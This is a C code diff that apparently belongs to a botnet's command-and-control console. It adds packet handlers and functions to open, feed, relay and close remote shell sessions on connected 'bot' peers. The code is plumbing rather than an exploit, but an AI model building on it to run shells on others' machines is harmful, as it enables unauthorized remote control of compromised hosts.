@@ -79,6 +79,29 @@ void shellC_handleRmvPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uDat
     shellC_rmvPeer(client, bot, id);
 }
 
+void shellC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+    uint8_t buf[LAIKA_SHELL_DATA_MAX_LENGTH];
+    tShell_client *client = (tShell_client*)uData;
+
+    /* sanity check */
+    if (client->openShell == NULL)
+        LAIKA_ERROR("LAIKAPKT_AUTHENTICATED_SHELL_DATA: No shell open!\n");
+
+    laikaS_read(&peer->sock, buf, sz);
+    shellT_writeRawOutput(buf, sz);
+}
+
+void shellC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
+    tShell_client *client = (tShell_client*)uData;
+    
+    /* sanity check */
+    if (client->openShell == NULL)
+        LAIKA_ERROR("LAIKAPKT_AUTHENTICATED_SHELL_DATA: No shell open!\n");
+
+    /* close shell */
+    shellC_closeShell(client);
+}
+
 struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_HANDSHAKE_RES,
         shellC_handleHandshakeRes,
@@ -91,6 +114,14 @@ struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_RMV_PEER_RES,
         shellC_handleRmvPeer,
         crypto_kx_PUBLICKEYBYTES + sizeof(uint8_t),
+    false),
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_DATA,
+        shellC_handleShellData,
+        0,
+    true),
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_CLOSE,
+        shellC_handleShellClose,
+        0,
     false),
 };
 
@@ -105,6 +136,7 @@ void shellC_init(tShell_client *client) {
     );
 
     client->peers = hashmap_new(sizeof(tShell_hashMapElem), 8, 0, 0, shell_ElemHash, shell_ElemCompare, NULL, NULL);
+    client->openShell = NULL;
     client->peerTbl = NULL;
     client->peerTblCap = 4;
     client->peerTblCount = 0;
@@ -271,6 +303,38 @@ void shellC_rmvPeer(tShell_client *client, tShell_peer *oldPeer, int id) {
 
     /* finally, free peer */
     shellP_freePeer(oldPeer);
+}
+
+void shellC_openShell(tShell_client *client, tShell_peer *peer) {
+    /* check if we already have a shell open */
+    if (client->openShell)
+        return;
+
+    /* send SHELL_OPEN request */
+    laikaS_startOutPacket(client->peer, LAIKAPKT_AUTHENTICATED_SHELL_OPEN_REQ);
+    laikaS_write(&client->peer->sock, peer->pub, sizeof(peer->pub));
+    laikaS_endOutPacket(client->peer);
+    client->openShell = peer;
+}
+
+void shellC_closeShell(tShell_client *client) {
+    /* check if we have a shell open */
+    if (client->openShell == NULL)
+        return;
+
+    /* send SHELL_CLOSE request */
+    laikaS_emptyOutPacket(client->peer, LAIKAPKT_AUTHENTICATED_SHELL_CLOSE);
+    client->openShell = NULL;
+}
+
+void shellC_sendDataShell(tShell_client *client, uint8_t *data, size_t sz) {
+    /* check if we have a shell open */
+    if (client->openShell == NULL)
+        return;
+
+    laikaS_startVarPacket(client->peer, LAIKAPKT_AUTHENTICATED_SHELL_DATA);
+    laikaS_write(&client->peer->sock, data, sz);
+    laikaS_endVarPacket(client->peer);
 }
 
 void shellC_printInfo(tShell_peer *peer) {
